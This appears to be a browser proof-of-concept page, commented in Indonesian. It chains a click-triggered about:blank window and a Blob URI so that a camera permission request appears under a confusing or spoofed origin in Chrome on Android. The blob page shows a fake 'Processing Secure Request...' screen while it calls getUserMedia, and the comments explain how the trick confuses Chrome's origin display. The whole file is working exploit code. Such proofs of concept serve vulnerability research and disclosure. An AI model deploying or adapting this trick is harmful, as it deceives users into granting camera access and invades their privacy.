<!doctype html>
<html>
<head>
<meta name="viewport" content="width=device-width, initial-scale=1">
<style>html { font-family: sans-serif; background: transparent; }</style>
</head>
<body>
<script>
window.addEventListener('click', () => {
    // LEVEL 1: Buka about:blank (Mewarisi origin googlelogoligature)
    var newWin = window.open('about:blank');
    
    // LEVEL 2: Bikin Blob URI yang berisi eksekusi Kamera
    // Blob URI juga mewarisi origin, tapi format string-nya (blob:https://...) 
    // bikin Origin Formatter Android Chrome sering nge-glitch!
    const blobContent = `
        <!doctype html>
        <html>
        <head><meta name="viewport" content="width=device-width, initial-scale=1"></head>
        <body style="text-align:center; padding-top:50px; font-family:sans-serif;">
            <h2>Processing Secure Request...</h2>
            <script>
                // Eksekusi API Kamera dari dalam rantai Blob!
                setTimeout(() => {
                    navigator.mediaDevices.getUserMedia({video: true})
                    .then(s => alert('SUCCESS: Camera Granted!'))
                    .catch(e => alert('ERROR: ' + e));
                }, 300);
            <\/script>
        </body>
        </html>
    `;
    
    // Konversi ke Blob
    const blob = new Blob([blobContent], {type: 'text/html'});
    const blobUrl = URL.createObjectURL(blob);
    
    // LEVEL 3: Navigasi window about:blank tadi ke Blob URI
    // Ini yang bikin UI Android Chrome pusing saat ngerender Permission Prompt!
    setTimeout(() => {
        newWin.location.href = blobUrl;
    }, 100);
});
</script>
</body>
</html>
